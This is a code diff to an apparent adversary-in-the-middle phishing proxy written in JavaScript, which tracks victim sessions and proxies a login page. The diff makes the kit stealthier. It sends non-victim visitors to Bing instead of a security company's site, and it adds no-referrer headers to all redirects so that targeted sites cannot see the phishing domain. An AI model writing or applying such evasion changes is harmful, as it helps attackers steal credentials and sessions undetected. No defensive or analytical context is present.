@@ -430,7 +430,8 @@ const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-c
 
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
-const REDIRECT_URL = "https://www.intrinsec.com/";
+// CHANGED: Redirect target is now Bing
+const REDIRECT_URL = "https://www.bing.com/";
 
 const PROXY_FILES = {
     index: "index_smQGUDpTF7PN.html",
@@ -1309,7 +1310,11 @@ ${flag} **Location:** ${location}
             return;
         }
         else if (url === PROXY_PATHNAMES.favicon) {
-            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
+            // Redirect with no-referrer
+            clientResponse.writeHead(301, {
+                'Location': `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}`,
+                'Referrer-Policy': 'no-referrer'
+            });
             clientResponse.end();
         }
 
@@ -1346,7 +1351,10 @@ ${flag} **Location:** ${location}
                                         VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                         VICTIM_SESSIONS[cookieName].host = phishedURL.host;
 
-                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
+                                        clientResponse.writeHead(301, {
+                                            'Location': `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}`,
+                                            'Referrer-Policy': 'no-referrer'
+                                        });
                                         clientResponse.end();
                                     }
                                     catch (error) {
@@ -1355,14 +1363,20 @@ ${flag} **Location:** ${location}
                                         fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                     }
                                 } else {
-                                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                                    clientResponse.writeHead(301, {
+                                        'Location': REDIRECT_URL,
+                                        'Referrer-Policy': 'no-referrer'
+                                    });
                                     clientResponse.end();
                                 }
                             } catch (error) {
                                 displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                             }
                         } else {
-                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
+                            clientResponse.writeHead(301, {
+                                'Location': REDIRECT_URL,
+                                'Referrer-Policy': 'no-referrer'
+                            });
                             clientResponse.end();
                         }
                     }
@@ -1406,7 +1420,10 @@ ${flag} **Location:** ${location}
                                                 VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                                 VICTIM_SESSIONS[currentSession].host = phishedURL.host;
 
-                                                clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
+                                                clientResponse.writeHead(301, {
+                                                    'Location': `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}`,
+                                                    'Referrer-Policy': 'no-referrer'
+                                                });
                                                 clientResponse.end();
                                             }
                                             catch (error) {
@@ -1504,7 +1521,10 @@ ${flag} **Location:** ${location}
     }
 
     else {
-        clientResponse.writeHead(301, { Location: REDIRECT_URL });
+        clientResponse.writeHead(301, {
+            'Location': REDIRECT_URL,
+            'Referrer-Policy': 'no-referrer'
+        });
         clientResponse.end();
     }
 });
